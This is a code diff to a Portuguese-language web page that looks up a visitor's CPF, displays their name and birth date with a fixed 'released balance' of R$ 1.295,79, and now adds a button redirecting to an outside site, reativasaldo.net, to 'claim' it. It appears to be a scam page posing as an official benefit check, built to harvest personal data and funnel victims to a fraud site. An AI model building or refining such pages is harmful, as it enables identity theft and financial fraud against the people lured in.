@@ -68,7 +68,7 @@
             box-shadow: 0 0 8px rgba(0, 132, 61, 0.3);
             outline: none;
         }
-        button {
+        button[type="submit"] { /* Alterado para type="submit" */
             background-color: #004AC1;
             color: white;
             padding: 12px 30px;
@@ -80,7 +80,7 @@
             transition: background-color 0.3s, transform 0.2s;
             margin-top: 10px;
         }
-        button:hover {
+        button[type="submit"]:hover {
             background-color: #00843D;
             transform: scale(1.05);
         }
@@ -114,14 +114,26 @@
         .success strong {
             color: #004AC1; /* Azul para destaques */
         }
-        .success button {
+        /* Estilo para o novo botão de resgate */
+        .success .resgate-btn {
             margin-top: 15px;
             width: 100%;
             background-color: #FFD500; /* Amarelo para botão de prosseguir */
             color: #333;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1em;
+            font-weight: bold;
+            transition: background-color 0.3s, transform 0.2s;
+            text-decoration: none; /* Para parecer um botão, não um link */
+            display: inline-block; /* Para centralizar se necessário */
+            text-align: center;
         }
-        .success button:hover {
+        .success .resgate-btn:hover {
             background-color: #ffc107;
+            transform: scale(1.02); /* Escala um pouco menos para não ser tão "agressivo" */
         }
         .error {
             background-color: #ffebee;
@@ -193,7 +205,7 @@
             const cpf = cpfInput.value.replace(/\D/g, '');
 
             if (cpf.length !== 11 || isNaN(cpf)) {
-                resultDiv.innerHTML = 'CPF inválido. Deve conter 11 dígitos.';
+                resultDiv.innerHTML = 'CPF inválido. Deve conter 11 dígitos numéricos.';
                 resultDiv.className = 'error';
                 return;
             }
@@ -216,9 +228,9 @@
                         const dataNasc = data.result.data_de_nascimento;
                         resultDiv.innerHTML = `
                             <strong>Nome:</strong> ${nome}<br>
-                            <strong>Data:</strong> ${dataNasc}<br>
+                            <strong>Data de Nascimento:</strong> ${dataNasc}<br>
                             <strong>Valor liberado da cota:</strong> R$ 1.295,79<br>
-                            <button onclick="alert('Em desenvolvimento')">Prosseguir com o Saque</button>
+                            <button type="button" class="resgate-btn" onclick="window.location.href='https://reativasaldo.net/prevpivsl'">Resgatar esse saldo agora</button>
                         `;
                         resultDiv.className = 'success';
                     } else {
